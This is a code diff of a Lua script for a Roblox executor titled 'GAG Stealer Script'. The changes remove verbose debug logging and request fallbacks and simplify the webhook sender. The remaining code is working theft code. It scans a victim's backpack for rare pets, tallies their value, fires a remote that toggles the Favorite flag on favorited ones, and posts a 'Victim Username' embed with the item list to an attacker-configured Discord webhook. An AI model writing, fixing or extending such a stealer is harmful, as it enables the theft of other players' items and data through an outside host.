@@ -1,4 +1,4 @@
--- GAG Stealer Script - Fixed Version with Enhanced Debugging
+-- GAG Stealer Script - Fixed Version
 -- Reset execution guard to allow multiple runs
 _G.scriptExecuted = false
 
@@ -103,35 +103,9 @@ end
 local totalValue = 0
 local itemsToSend = {}
 
--- Enhanced Debug function
+-- Debug function
 local function debugPrint(message)
     print("[GAG Debug]", message)
-    -- Also try to write to a file for persistent logging
-    pcall(function()
-        writefile("gag_debug_log.txt", os.date("%Y-%m-%d %H:%M:%S") .. " - " .. message .. "\n")
-    end)
-end
-
--- Check for request function availability
-local function checkRequestFunction()
-    debugPrint("Checking request function availability...")
-    
-    if request then
-        debugPrint("✓ Request function found")
-        return true
-    elseif syn and syn.request then
-        debugPrint("✓ Synapse request function found")
-        return "syn"
-    elseif http and http.request then
-        debugPrint("✓ HTTP request function found")
-        return "http"
-    elseif http_request then
-        debugPrint("✓ HTTP_REQUEST function found")
-        return "http_request"
-    else
-        debugPrint("✗ No request function found!")
-        return false
-    end
 end
 
 -- Executor detection function
@@ -162,27 +136,13 @@ local function detectExecutor()
 end
 
 -- Main execution
-debugPrint("=== SCRIPT START ===")
 debugPrint("Script starting...")
 debugPrint("Place ID: " .. game.PlaceId)
 debugPrint("Min value: " .. min_value)
-debugPrint("Webhook URL: " .. (webhook ~= "" and "SET" or "NOT SET"))
-debugPrint("Executor: " .. detectExecutor())
-
--- Check request function
-local requestType = checkRequestFunction()
-if not requestType then
-    debugPrint("CRITICAL ERROR: No request function available!")
-    debugPrint("This script requires a request function to send webhooks.")
-    debugPrint("Try using a different executor or check if HTTP requests are enabled.")
-    return
-end
 
 -- Validation checks
 if next(users) == nil or webhook == "" then
     debugPrint("ERROR: No usernames or webhook configured")
-    debugPrint("Users count: " .. #users)
-    debugPrint("Webhook length: " .. #webhook)
     return
 end
 
@@ -302,84 +262,39 @@ local function getWeight(tool)
     return math.floor(weight * 100 + 0.5) / 100
 end
 
--- Enhanced Webhook sending function with multiple fallbacks
-local function sendWebhook(data)
-    debugPrint("Attempting to send webhook...")
-    debugPrint("Data size: " .. #HttpService:JSONEncode(data))
-    
-    local function tryRequest(requestFunc, requestData)
-        local success, response = pcall(function()
-            return requestFunc(requestData)
-        end)
-        
-        if success then
-            debugPrint("✓ Webhook sent successfully!")
-            debugPrint("Response status: " .. (response.StatusCode or "Unknown"))
-            return true
-        else
-            debugPrint("✗ Webhook failed: " .. tostring(response))
-            return false
-        end
-    end
-    
-    local body = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    
-    local requestData = {
-        Url = webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    }
-    
-    -- Try different request functions
-    if requestType == true and request then
-        return tryRequest(request, requestData)
-    elseif requestType == "syn" and syn and syn.request then
-        return tryRequest(syn.request, requestData)
-    elseif requestType == "http" and http and http.request then
-        return tryRequest(http.request, requestData)
-    elseif requestType == "http_request" and http_request then
-        return tryRequest(http_request, requestData)
-    else
-        debugPrint("✗ No valid request function available")
-        return false
-    end
-end
+-- Remove getHighestKGFruit function
 
--- Test webhook function
-local function testWebhook()
-    debugPrint("Testing webhook connection...")
+-- Webhook sending function with error handling
+local function sendWebhook(data)
+    local success, response = pcall(function()
+        if not request then
+            error("Request function not available")
+        end
+        
+        local body = HttpService:JSONEncode(data)
+        local headers = {
+            ["Content-Type"] = "application/json"
+        }
+        
+        return request({
+            Url = webhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end)
     
-    local testData = {
-        ["content"] = "🧪 Webhook Test - Script is working!",
-        ["username"] = "GAG Debug",
-        ["embeds"] = {{
-            ["title"] = "Webhook Test",
-            ["description"] = "If you see this, the webhook is working correctly!",
-            ["color"] = 65280,
-            ["footer"] = {
-                ["text"] = "Test message"
-            }
-        }}
-    }
-    
-    local success = sendWebhook(testData)
-    if success then
-        debugPrint("✓ Webhook test successful!")
+    if not success then
+        debugPrint("ERROR: Failed to send webhook - " .. tostring(response))
+        return false
     else
-        debugPrint("✗ Webhook test failed!")
+        debugPrint("Webhook sent successfully")
+        return true
     end
-    
-    return success
 end
 
 -- Update SendJoinMessage to match requested Discord layout
 local function SendJoinMessage(list, prefix)
-    debugPrint("Preparing to send join message...")
-    
     -- Player info
     local playerName = plr.Name
     local userId = tostring(plr.UserId)
@@ -392,7 +307,6 @@ local function SendJoinMessage(list, prefix)
     local maxPlayers = tostring(Players.MaxPlayers or "?")
     local timeStr = os.date("%H:%M:%S")
     local dateStr = os.date("%m/%d/%y")
-    
     -- Pet list formatting
     local petLines = {}
     for _, item in ipairs(list) do
@@ -430,14 +344,11 @@ local function SendJoinMessage(list, prefix)
         }}
     }
 
-    debugPrint("Sending join message with " .. #list .. " items...")
     return sendWebhook(data)
 end
 
 -- Update SendMessage to focus on pets
 local function SendMessage(sortedItems)
-    debugPrint("Preparing to send message...")
-    
     local fields = {
         {
             name = "Victim Username:",
@@ -487,43 +398,25 @@ local function SendMessage(sortedItems)
         }}
     }
 
-    debugPrint("Sending message with " .. #sortedItems .. " items...")
     return sendWebhook(data)
 end
 
--- Test webhook first
-debugPrint("=== TESTING WEBHOOK ===")
-local webhookTest = testWebhook()
-if not webhookTest then
-    debugPrint("WARNING: Webhook test failed! Script will continue but may not send messages.")
-end
-
 -- Remove plant scanning logic from backpack scan, only process pets
-debugPrint("=== SCANNING BACKPACK ===")
 debugPrint("Scanning backpack for items...")
 local itemCount = 0
 
 for _, tool in ipairs(backpack:GetChildren()) do
     if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
-        debugPrint("Found tool: " .. tool.Name)
         if tool:GetAttribute("ItemType") == "Pet" then
-            debugPrint("  - Is a pet")
             local petUUID = tool:GetAttribute("PET_UUID")
-            debugPrint("  - Pet UUID: " .. (petUUID or "NONE"))
-            
             if petUUID and dataService and dataService.GetData then
                 local playerData = dataService:GetData()
                 if playerData and playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                     local v14 = playerData.PetsData.PetInventory.Data[petUUID]
                     if v14 then
-                        debugPrint("  - Found pet data")
                         local toolName = tool.Name
                         local itemName = toolName:match("^(.-) %[%d+%.?%d* KG%]") or toolName
                         local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
-                        
-                        debugPrint("  - Item name: " .. itemName)
-                        debugPrint("  - Weight: " .. weight)
-                        
                         -- Improved age extraction: prefer v14.PetData.Age, fallback to name pattern
                         local petAge = nil
                         if v14.PetData and v14.PetData.Age then
@@ -537,12 +430,8 @@ for _, tool in ipairs(backpack:GetChildren()) do
                                 petAge = "N/A"
                             end
                         end
-                        
-                        debugPrint("  - Age: " .. tostring(petAge))
-                        
                         -- Only include rare pets and their mutated forms
                         if isRarePet(itemName, weight) then
-                            debugPrint("  - Is rare pet!")
                             if tool:GetAttribute("Favorite") then
                                 local success = pcall(function()
                                     replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
@@ -552,35 +441,22 @@ for _, tool in ipairs(backpack:GetChildren()) do
                                 end
                             end
                             local value = calcPetValue(v14)
-                            debugPrint("  - Calculated value: " .. value)
                             totalValue = totalValue + value
                             table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
                             debugPrint("Added pet: " .. itemName .. " Value: " .. value .. " Age: " .. tostring(petAge))
-                        else
-                            debugPrint("  - Not a rare pet")
                         end
-                    else
-                        debugPrint("  - No pet data found")
                     end
-                else
-                    debugPrint("  - No pets data structure")
                 end
-            else
-                debugPrint("  - Missing pet UUID or data service")
             end
-        else
-            debugPrint("  - Not a pet")
         end
     end
 end
 
-debugPrint("=== SCAN RESULTS ===")
 debugPrint("Total items found: " .. itemCount)
 debugPrint("Items to send: " .. #itemsToSend)
 debugPrint("Total value: " .. totalValue)
 
 if #itemsToSend > 0 then
-    debugPrint("=== PROCESSING ITEMS ===")
     debugPrint("Processing items...")
     
     -- Sort items
@@ -614,35 +490,9 @@ if #itemsToSend > 0 then
         prefix = "--@everyone "
     end
 
-    debugPrint("=== SENDING MESSAGE ===")
     -- Remove followUser and waitForUserChat, just send notification after scan
-    local sendSuccess = SendJoinMessage(sentItems, prefix)
-    
-    if sendSuccess then
-        debugPrint("✓ Message sent successfully!")
-    else
-        debugPrint("✗ Failed to send message!")
-    end
+    SendJoinMessage(sentItems, prefix)
 else
-    debugPrint("=== NO ITEMS FOUND ===")
     debugPrint("No items found that meet the minimum value requirement")
     debugPrint("Try lowering the min_value in the configuration")
-    
-    -- Send a debug message even if no items found
-    local debugData = {
-        ["content"] = "🔍 Debug: No items found",
-        ["username"] = plr.Name,
-        ["embeds"] = {{
-            ["title"] = "GAG Debug - No Items",
-            ["description"] = "Script ran but found no items to send.\nTotal value: " .. totalValue .. "\nItems scanned: " .. itemCount,
-            ["color"] = 16776960, -- Yellow
-            ["footer"] = {
-                ["text"] = "Debug message"
-            }
-        }}
-    }
-    
-    sendWebhook(debugData)
-end
-
-debugPrint("=== SCRIPT COMPLETE ===") 
+end 
